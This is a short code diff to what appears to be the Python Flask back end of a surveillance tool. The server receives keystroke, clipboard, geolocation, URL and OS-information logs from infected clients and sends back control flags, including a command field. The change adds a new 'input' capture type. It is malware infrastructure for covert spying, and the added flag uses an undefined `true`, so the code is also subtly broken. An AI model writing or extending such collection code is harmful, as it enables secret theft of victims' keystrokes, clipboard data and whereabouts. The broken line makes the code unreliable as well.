@@ -16,7 +16,8 @@ log_files = {
     'KEY': os.path.join(log_dir, 'key_log.json'),
     'CLIP': os.path.join(log_dir, 'clip_log.json'),
     'LOC': os.path.join(log_dir, 'loc_log.json'),
-    'OSI': os.path.join(log_dir, 'os_info_log.json')
+    'OSI': os.path.join(log_dir, 'os_info_log.json'),
+    'INPUT': os.path.join(log_dir, 'input_info_log.json'),
 }
 
 # 初始化日志文件
@@ -31,6 +32,7 @@ flags = {
     "geolocation": "true",
     "keylog": "true",
     "urls": "true",
+    "input": true,
     "cmd": ""  # 清空 cmd，因为不需要命令
 }
 
@@ -46,7 +48,7 @@ def log_data():
             # 返回标志位，不记录 CMD 日志
             return jsonify(flags), 200
 
-        if log_type in ["URL", "KEY", "CLIP", "LOC", "OSI"]:
+        if log_type in ["URL", "KEY", "CLIP", "LOC", "OSI", "INPUT"]:
             print(f"Received log: {data}")  # 仅调试输出这几类日志
 
         if log_type == "CLIP":
